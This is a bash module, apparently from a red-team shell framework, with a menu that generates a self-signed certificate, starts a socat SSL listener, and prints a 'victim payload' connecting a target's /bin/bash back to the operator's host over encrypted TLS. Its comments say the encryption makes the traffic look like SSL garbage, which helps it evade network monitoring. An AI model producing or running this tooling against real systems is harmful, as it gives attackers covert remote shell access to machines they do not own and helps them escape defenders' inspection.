#!/bin/bash

# ==========================================
# Module: Encryption (Phase 3)
# Handling SSL/TLS Shells using Socat/OpenSSL
# ==========================================

CERT_DIR="tmp"
CERT_NAME="bind.pem"

check_dependencies() {
    if ! command -v socat &> /dev/null; then
        echo -e "${RED}[!] socat is not installed. Run: sudo apt install socat${NC}"
        return 1
    fi
    if ! command -v openssl &> /dev/null; then
        echo -e "${RED}[!] openssl is not installed.${NC}"
        return 1
    fi
    return 0
}

generate_cert() {
    echo -e "${CYAN}[*] Generating self-signed certificate...${NC}"
    mkdir -p "$CERT_DIR"
    
    # Generate Key and Cert, then combine them into a PEM file for socat
    openssl req -newkey rsa:2048 -nodes -keyout "$CERT_DIR/bind.key" \
        -x509 -days 365 -out "$CERT_DIR/bind.crt" \
        -subj "/C=US/ST=RedTeam/L=Framework/O=Security/CN=shell" 2>/dev/null
        
    cat "$CERT_DIR/bind.key" "$CERT_DIR/bind.crt" > "$CERT_DIR/$CERT_NAME"
    
    echo -e "${GREEN}[+] Certificate generated at: $CERT_DIR/$CERT_NAME${NC}"
}

start_socat_listener() {
    check_dependencies || return
    
    # Check if cert exists, if not generate it
    if [ ! -f "$CERT_DIR/$CERT_NAME" ]; then
        generate_cert
    fi
    
    read -p "Enter LPORT for Encrypted Listener: " port
    
    echo -e "${GREEN}[+] Starting Socat SSL Listener on port $port...${NC}"
    echo -e "${YELLOW}[!] This shell is ENCRYPTED. Traffic will look like SSL garbage.${NC}"
    
    # Socat listener command
    # file:`tty`,raw,echo=0 -> Keeps your local terminal sanity
    # OPENSSL-LISTEN -> Handles the encryption
    socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:$port,cert=$CERT_DIR/$CERT_NAME,verify=0
}

gen_socat_payload() {
    echo -e "${CYAN}[i] Generating Socat SSL Payload${NC}"
    
    default_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    read -p "   Enter LHOST [$default_ip]: " lhost
    lhost=${lhost:-$default_ip}
    read -p "   Enter LPORT: " lport
    
    echo ""
    echo -e "${YELLOW}--- VICTIM PAYLOAD (Requires Socat on Target) ---${NC}"
    echo "socat OPENSSL:$lhost:$lport,verify=0 EXEC:/bin/bash"
    echo -e "${YELLOW}-------------------------------------------------${NC}"
    echo ""
    read -p "Press Enter..."
}

encrypt_menu() {
    while true; do
        clear
        echo ""
        echo "$(color_cyan '╔══════════════════════════════════════════╗')"
        echo "$(color_cyan '║')     ENCRYPTION MENU  (Socat/SSL)        $(color_cyan '║')"
        echo "$(color_cyan '╚══════════════════════════════════════════╝')"
        echo ""
        echo "  $(color_yellow '1.')  Generate New Certificate"
        echo "  $(color_yellow '2.')  Start Encrypted Listener (Server)"
        echo "  $(color_yellow '3.')  Generate Encrypted Payload (Client)"
        echo "  $(color_yellow '4.')  Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read -r e_choice

        case $e_choice in
            1) generate_cert ;;
            2) start_socat_listener ;;
            3) gen_socat_payload ;;
            4) break ;;
            *) error_msg "Invalid option"; sleep 2 ;;
        esac
    done
}
